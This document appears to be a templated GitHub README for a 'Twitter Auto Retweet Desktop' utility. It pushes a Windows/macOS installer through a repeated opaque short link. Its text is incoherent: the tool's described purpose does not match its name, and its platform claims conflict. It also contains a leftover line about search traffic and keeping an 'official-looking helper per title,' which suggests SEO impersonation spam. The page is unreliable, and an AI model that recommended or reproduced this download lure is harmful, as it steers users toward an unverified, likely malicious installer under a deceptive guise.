![Twitter Auto Retweet Desktop](assets/hero.png)

# Twitter Auto Retweet Desktop

*Keep the Twitter Auto Retweet data folder tidy before an update.*

## Overview

**Twitter Auto Retweet Desktop** is a Windows utility. A local helper for Twitter Auto Retweet data folders, config and export files, and photo albums on Windows and macOS.

Patches move Twitter Auto Retweet data paths without warning.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Locates Twitter Auto Retweet user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Twitter Auto Retweet is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/emma-5306/twitter-auto-retweet-desktop

MIT license. See `LICENSE`.
